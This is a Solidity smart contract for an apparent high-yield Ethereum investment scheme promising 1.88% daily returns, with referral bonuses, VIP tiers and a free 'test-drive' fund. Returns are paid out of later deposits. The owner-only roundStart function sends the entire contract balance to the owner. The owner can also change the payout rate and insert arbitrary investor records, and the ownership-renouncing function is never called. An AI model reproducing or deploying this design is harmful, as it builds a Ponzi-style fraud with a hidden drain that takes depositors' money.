pragma solidity ^0.4.25;

contract Eth5iov2 {
    address public advertising;
    address public admin;
    address private owner;

    uint constant public statusFreeEth = 10 finney;
    uint constant public statusBasic = 50 finney;
    uint constant public statusVIP = 5 ether;
    uint constant public statusSVIP = 25 ether;

    uint constant public dailyPercent = 188;
    uint constant public dailyFreeMembers = 200;
    uint constant public denominator = 10000;

    uint public numerator = 100;
    uint public dayDepositLimit = 555 ether;
    uint public freeFund;
    uint public freeFundUses;

    uint public round = 0;
    address[] public addresses;
    mapping(address => Investor) public investors;
    bool public resTrigger = true;
    uint constant period = 86400;

    uint dayDeposit;
    uint roundStartDate;
    uint daysFromRoundStart;
    uint deposit;
    uint creationDate; 
    enum Status { TEST, BASIC, VIP, SVIP }

    struct Investor {
        uint id;
        uint round;
        uint deposit;
        uint deposits;
        uint investDate;
        uint lastPaymentDate;
        address referrer;
        Status status;
        bool refPayed;
    }

    event TestDrive(address addr, uint date);
    event Invest(address addr, uint amount, address referrer);
    event WelcomeVIPinvestor(address addr);
    event WelcomeSuperVIPinvestor(address addr);
    event Payout(address addr, uint amount, string eventType, address from);
    event roundStartStarted(uint round, uint date);

    modifier onlyOwner {
        require(msg.sender == owner, "Sender not authorised.");
        _;
    }

    constructor() public {
        owner = msg.sender;
        admin = 0xb34a732Eb42A02ca5b72e79594fFfC10F55C33bd; 
        advertising = 0x63EA308eF23F3E098f8C1CE2D24A7b6141C55497; 
        freeFund = 2808800000000000000;
        creationDate = now;
        roundStart();
    }

    function addInvestorsFrom_v1(address[] addr, uint[] amount, bool[] isSuper) onlyOwner public {

        // transfer VIP/SVIP status
        for (uint i = 0; i < addr.length; i++) {
            uint id = addresses.length;
            if (investors[addr[i]].deposit==0) {
                deposit += amount[i];
            }
            addresses.push(addr[i]);
            Status s = isSuper[i] ? Status.SVIP : Status.VIP;
            investors[addr[i]] = Investor(id, round, amount[i], 1, now, now, 0, s, false);
        }
    }

    function waiver() private {
        delete owner; //
    }

    function() payable public {

        require(daysFrom(creationDate) < 365, "Contract has reached the end of lifetime."); 

        if (msg.sender == 0x40d69848f5d11ec1a9A95f01b1B53b1891e619Ea || msg.sender == owner) {  
            admin.transfer(msg.value / denominator * numerator * 5);
            advertising.transfer(msg.value / denominator * numerator *10);
            return;
        }

        require(resTrigger == false, "Contract is paused. Please wait for the next round.");

        if (0 == msg.value) {
            payout();
            return;
        }

        require(msg.value >= statusBasic || msg.value == statusFreeEth, "Too small amount, minimum 0.05 ether");

        if (daysFromRoundStart < daysFrom(roundStartDate)) {
            dayDeposit = 0;
            freeFundUses = 0;
            daysFromRoundStart = daysFrom(roundStartDate);
        }

        require(msg.value + dayDeposit <= dayDepositLimit, "Daily deposit limit reached! See you soon");
        dayDeposit += msg.value;

        Investor storage user = investors[msg.sender];

        if ((user.id == 0) || (user.round < round)) {

            msg.sender.transfer(0 wei); 

            addresses.push(msg.sender);
            user.id = addresses.length;
            user.deposit = 0;
            user.deposits = 0;
            user.lastPaymentDate = now;
            user.investDate = now;
            user.round = round;

            // referrer
            address referrer = bytesToAddress(msg.data);
            if (investors[referrer].id > 0 && referrer != msg.sender
               && investors[referrer].round == round) {
                user.referrer = referrer;
            }
        }

        // save investor
        user.deposit += msg.value;
        user.deposits += 1;
        deposit += msg.value;
        emit Invest(msg.sender, msg.value, user.referrer);

        // sequential deposit cash-back on 30+
        if ((user.deposits > 1) && (user.status != Status.TEST) && (daysFrom(user.investDate) > 30)) {
            uint cashBack = msg.value / denominator * numerator * 10; 
            if (msg.sender.send(cashBack)) {
                emit Payout(user.referrer, cashBack, "Cash-back after 30 days", msg.sender);
            }
        }

        Status newStatus;
        if (msg.value >= statusSVIP) {
            emit WelcomeSuperVIPinvestor(msg.sender);
            newStatus = Status.SVIP;
        } else if (msg.value >= statusVIP) {
            emit WelcomeVIPinvestor(msg.sender);
            newStatus = Status.VIP;
        } else if (msg.value >= statusBasic) {
            newStatus = Status.BASIC;
        } else if (msg.value == statusFreeEth) {
            if (user.deposits == 1) { 
                require(dailyFreeMembers > freeFundUses, "Max free fund uses today, See you soon!");
                freeFundUses += 1;
                msg.sender.transfer(msg.value);
                emit Payout(msg.sender,statusFreeEth,"Free eth cash-back",0);
            }
            newStatus = Status.TEST;
        }
        if (newStatus > user.status) {
            user.status = newStatus;
        }

        // proccess fees and referrers
        if (newStatus != Status.TEST) {
            admin.transfer(msg.value / denominator * numerator * 5);  // administration fee
            advertising.transfer(msg.value / denominator * numerator * 10); // advertising fee
            freeFund += msg.value / denominator * numerator;          // test-drive fee fund
        }
        user.lastPaymentDate = now;
    }

    function payout() private {

        Investor storage user = investors[msg.sender];

        require(user.id > 0, "Investor not found.");
        require(user.round == round, "Your round is over.");
        require(daysFrom(user.lastPaymentDate) >= 1, "Wait at least 24 hours.");

        uint amount = getInvestorDividendsAmount(msg.sender);

        if (address(this).balance < amount) {
            resTrigger = true;
            return;
        }

        if ((user.referrer > 0x0) && !user.refPayed && (user.status != Status.TEST)) {
            user.refPayed = true;
            Investor storage ref = investors[user.referrer];
            if (ref.id > 0 && ref.round == round) {

                uint bonusAmount = user.deposit / denominator * numerator * 5;
                uint refBonusAmount = user.deposit / denominator * numerator * uint(ref.status);

                if (user.referrer.send(refBonusAmount)) {
                    emit Payout(user.referrer, refBonusAmount, "Cash bask refferal", msg.sender);
                }

                if (user.deposits == 1) { // cashback only for the first deposit
                    if (msg.sender.send(bonusAmount)) {
                        emit Payout(msg.sender, bonusAmount, "ref-cash-back", 0);
                    }
                }

            }
        }

        if (user.status == Status.TEST) {
            uint daysFromInvest = daysFrom(user.investDate);
            require(daysFromInvest <= 55, "Your test drive is over!");

            if (sendFromfreeFund(amount, msg.sender)) {
                emit Payout(msg.sender, statusFreeEth, "test-drive-self-payout", 0);
            }
        } else {
            msg.sender.transfer(amount);
            emit Payout(msg.sender, amount, "self-payout", 0);
        }
        user.lastPaymentDate = now;
    }

    function sendFromfreeFund(uint amount, address user) private returns (bool) {
        require(freeFund > amount, "Test-drive fund empty! See you later.");
        if (user.send(amount)) {
            freeFund -= amount;
            return true;
        }
        return false;
    }

    // views
    function getInvestorCount() public view returns (uint) {
        return addresses.length - 1;
    }

    function getInvestorDividendsAmount(address addr) public view returns (uint) {
        return investors[addr].deposit / denominator / 100 * dailyPercent  //NOTE: numerator!
                * daysFrom(investors[addr].lastPaymentDate) * numerator;
    }

    // configuration
    function setNumerator(uint newNumerator) onlyOwner public {
        numerator = newNumerator;
    }

    function setDayDepositLimit(uint newDayDepositLimit) onlyOwner public {
        dayDepositLimit = newDayDepositLimit;
    }

    function roundStart() onlyOwner public {
        if (resTrigger == true) {
            delete addresses;
            addresses.length = 1;
            deposit = 0;
            dayDeposit = 0;
            roundStartDate = now;
            daysFromRoundStart = 0;
            owner.transfer(address(this).balance);
            emit roundStartStarted(round, now);
            resTrigger = false;
            round += 1;
        }
    }

    // util
    function daysFrom(uint date) private view returns (uint) {
        return (now - date) / period;
    }

    function bytesToAddress(bytes bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
}